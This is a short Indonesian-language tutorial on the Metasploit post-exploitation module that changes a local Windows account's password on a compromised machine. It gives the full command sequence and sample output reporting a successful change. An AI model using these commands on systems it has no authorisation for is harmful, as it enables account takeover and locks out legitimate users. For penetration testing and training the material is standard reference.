# change_password

Modul `change_password` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengubah password akun pengguna lokal pada komputer target.

## Cara Penggunaan di Metasploit

```
use post/windows/manage/change_password
set NEW_PASSWORD <PASSWORD_BARU>
set OLD_PASSWORD <PASSWORD_LAMA>
set SESSION <ID>
set SMBDomain <DOMAIN>
set SMBUser <USERNAME>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Changing ADMIN-PC\fixploit03 password to 10101010...
[+] Password change successful.
[*] Post module execution completed
```
